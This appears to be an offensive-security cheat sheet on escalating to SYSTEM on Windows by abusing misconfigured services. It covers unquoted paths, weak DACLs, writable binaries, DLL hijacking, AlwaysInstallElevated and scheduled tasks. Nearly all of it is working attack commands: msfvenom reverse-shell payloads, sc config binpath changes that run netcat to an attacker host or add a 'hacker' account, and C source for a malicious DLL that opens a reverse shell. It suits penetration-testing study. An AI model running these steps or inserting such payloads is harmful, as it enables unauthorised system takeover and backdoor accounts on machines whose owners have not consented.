title: Windows PrivEsc — Service Misconfigurations
html:
Windows PrivEsc — Service Misconfigurations

Windows services running as SYSTEM with weak permissions (writable binary, weak DACL, unquoted path, missing DLL) are reliable privilege escalation paths. PowerUp automates discovery.

Unquoted Service Path

If a service binary path contains spaces and is not quoted, Windows tries to execute each possible path segment. Planting a binary at an earlier segment gives SYSTEM execution.

REM Find unquoted service paths (auto-start, not in Windows dir)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""

REM PowerShell version
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.StartMode -eq 'Auto' -and
    $_.PathName -notlike '"*' -and
    $_.PathName -notlike 'C:\Windows*' -and
    $_.PathName -match ' '
} | Select-Object Name,PathName

REM PowerUp
Get-ServiceUnquoted

Exploiting Unquoted Path

REM Example: C:\Program Files\Vuln App\service.exe
REM Windows tries:
REM   C:\Program.exe
REM   C:\Program Files\Vuln.exe
REM   C:\Program Files\Vuln App\service.exe

REM Check which directories are writable
icacls "C:\Program Files\Vuln App"
icacls "C:\Program Files"

REM Generate malicious exe (on attacker)
REM msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o Vuln.exe

REM Place in writable path segment
copy C:\Temp\Vuln.exe "C:\Program Files\Vuln.exe"

REM Restart the service (if you have permission)
sc stop VulnService && sc start VulnService

REM Or wait for reboot / trigger restart

Weak Service Permissions

REM Check service DACL with sc sdshow
sc sdshow VulnService

REM Decode SDDL - look for:
REM   BU = Builtin Users (Authenticated Users can modify)
REM   RP = Start, WP = Stop, DC = Change config

REM Check with accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv * 2>nul
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv <username> *

REM PowerUp discovery
Get-ModifiableService
Invoke-ServiceAbuse -Name 'VulnService'
Invoke-ServiceAbuse -Name 'VulnService' -Command 'net user hacker <password> /add'

Modify Service Config (if you have SERVICE_CHANGE_CONFIG)

REM Change service binary path to malicious exe
sc config VulnService binpath= "C:\Temp\evil.exe"
sc config VulnService binpath= "cmd /c net user hacker <password> /add"
sc config VulnService binpath= "cmd /c C:\Temp\nc.exe <lhost> <lport> -e cmd.exe"

REM Start the service
sc start VulnService

REM Restore original path after exploitation
sc config VulnService binpath= "C:\Program Files\Original\service.exe"

Writable Service Binary

REM Find service binaries current user can write to
accesschk.exe /accepteula -wuvc * 2>nul | findstr /i service

REM Check specific binary
icacls "C:\Path\To\service.exe"

REM PowerUp
Find-ModifiableServiceFile

REM If writable, replace with malicious binary
copy C:\Temp\evil.exe "C:\Path\To\service.exe" /y

REM Restart service
sc stop VulnService
sc start VulnService

DLL Hijacking

When a service loads a DLL that doesn't exist or searches in a user-controllable directory, place a malicious DLL there.

REM Find missing DLLs with Process Monitor (Sysinternals)
REM Filter: Operation = CreateFile, Path ends with .dll, Result = NAME NOT FOUND
REM Also: Operation = Load Image, Path ends with .dll, Result = NAME NOT FOUND

REM DLL search order (non-Safe DLL search mode):
REM 1. Directory of the executable
REM 2. System directory (C:\Windows\System32)
REM 3. 16-bit system directory (C:\Windows\System)
REM 4. Windows directory (C:\Windows)
REM 5. Current working directory
REM 6. PATH directories

REM Create malicious DLL (on attacker)
REM msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o evil.dll

REM Or custom DLL source

// evil.c - DLL that spawns cmd.exe as SYSTEM
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c C:\\Temp\\nc.exe <lhost> <lport> -e cmd.exe");
    }
    return TRUE;
}

REM Compile with mingw on Linux
REM x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c -lws2_32

REM Place malicious DLL in the searched path
copy C:\Temp\evil.dll "C:\Path\Service\Looks\For\missing.dll"

REM Restart service
sc stop VulnService && sc start VulnService

AlwaysInstallElevated

If both HKLM and HKCU AlwaysInstallElevated are set to 1, any MSI file runs as SYSTEM.

REM Check both keys (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM PowerUp check
Get-RegistryAlwaysInstallElevated

REM Create malicious MSI on attacker
REM msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o evil.msi

REM Install on target as normal user → runs as SYSTEM
msiexec /quiet /qn /i C:\Temp\evil.msi

REM PowerUp exploitation
Write-UserAddMSI
Invoke-AllChecks | Where-Object {$_.AbuseFunction -like '*AlwaysInstall*'}

Scheduled Tasks

REM List all scheduled tasks verbosely
schtasks /query /fo LIST /v
schtasks /query /fo CSV /v | ConvertFrom-CSV

REM PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like '*SYSTEM*' -or $_.Principal.UserId -like '*Administrator*'} | Select-Object TaskName,TaskPath

REM Find tasks with writable binary/script
schtasks /query /fo LIST /v | findstr "Task To Run"

REM Check task binary permissions
accesschk.exe /accepteula -wuvc C:\Path\To\task_binary.exe
icacls C:\Path\To\task_binary.exe

REM If writable, replace with reverse shell
copy C:\Temp\evil.exe C:\Path\To\task_binary.exe /y

REM Trigger manually if permissions allow
schtasks /run /tn "VulnTask"
excerpt: Exploit Windows service misconfigurations — unquoted service paths, weak service permissions, writable binaries, DLL hijacking, AlwaysInstallElevated, and scheduled task abuse.
